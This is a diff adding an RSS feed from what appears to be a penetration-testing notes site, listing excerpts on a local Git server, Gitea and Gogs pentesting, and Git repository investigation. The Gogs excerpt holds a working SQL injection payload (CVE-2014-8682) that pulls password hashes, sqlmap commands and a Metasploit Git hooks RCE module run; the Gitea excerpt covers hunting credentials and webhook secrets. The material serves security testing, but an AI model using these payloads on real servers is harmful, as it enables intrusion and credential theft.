@@ -1,0 +1,40 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Git on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/version-control/git/</link>
+    <description>Recent content in Git on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 16:00:03 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/version-control/git/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Create Git Local Server</title>
+      <link>https://documentnation.github.io/docs/hdks/version-control/git/create-git-local-server/</link>
+      <pubDate>Sun, 05 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/version-control/git/create-git-local-server/</guid>
+      <description>Start Local Git Server (Dumb, HTTP) link cd test_repo git init git add . &amp;amp;&amp;amp; git commit -m &amp;#34;first commit&amp;#34; cd .git # Update auxiliary info file to help dumb server. # --bare: Bare repository (does not have a working directory) git --bare update-server-info cd .. python3 -m http.server </description>
+    </item>
+    <item>
+      <title>Gitea Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/version-control/git/gitea-pentesting/</link>
+      <pubDate>Thu, 06 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/version-control/git/gitea-pentesting/</guid>
+      <description>Common Directories link /api/swagger /api/v1/repos/search?q=test /api/v1/users/search?q=test /api/v1/users/&amp;lt;username&amp;gt;/repos /explore/organizations /explore/repos /explore/users # OAuth /.well-known/openid-configuration /login/oauth/authorize /login/oauth/access_token /login/oauth/userinfo /login/oauth/keys Investigation linkRepositories linkIf we can access to repositories, we might be able to find sensitive information e.g. credentials, subdomains, other domains, secret keys, etc.&#xA;So check the source code.&#xA;Get Secrets in Web Hooks linkIn the existing repository, we may find the secret value in the repository → Settings → Web Hooks.&#xA;Find User Credentials linkIf we have access to the target system and the repository, that is pushed in Gitea, exists in the system, we might be able to find the credential.</description>
+    </item>
+    <item>
+      <title>Gogs Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/version-control/git/gogs-pentesting/</link>
+      <pubDate>Thu, 27 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/version-control/git/gogs-pentesting/</guid>
+      <description>SQL injection (CVE-2014-8682) link http://127.0.0.1:3000/api/v1/users/search?q=&amp;#39;)/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1-- Automation link sqlmap -u &amp;#34;https://example.com/api/v1/repos/search?q=test&amp;#34; sqlmap -u &amp;#34;https://example.com/api/v1/users/search?q=test&amp;#34; Git Hooks Remote Code Execution (RCE) link msfconsole msf&amp;gt; use exploit/multi/http/gogs_git_hooks_rce msf&amp;gt; (set options...) msf&amp;gt; run </description>
+    </item>
+    <item>
+      <title>Git GitHub Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/version-control/git/git-github-pentesting/</link>
+      <pubDate>Sat, 25 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/version-control/git/git-github-pentesting/</guid>
+      <description>Git Commands for the Repository Investigation linkCheck Information link # Basic information git show git show &amp;lt;branch-name&amp;gt; git show &amp;lt;commit-id&amp;gt; git show &amp;lt;tag-name&amp;gt; git --git-dir /path/to/.git show # Configuration git config --list # Commit history git log git log --stat git --git-dir /path/to/.git log --stat # Compare the two commits git diff git diff --staged git diff --cached # Working tree status git status Back to the Previous Commits link # You can get the &amp;#34;commit-id&amp;#34; by &amp;#39;git log&amp;#39; git checkout &amp;lt;commit-id&amp;gt; git --git-dir /path/to/.</description>
+    </item>
+  </channel>
+</rss>
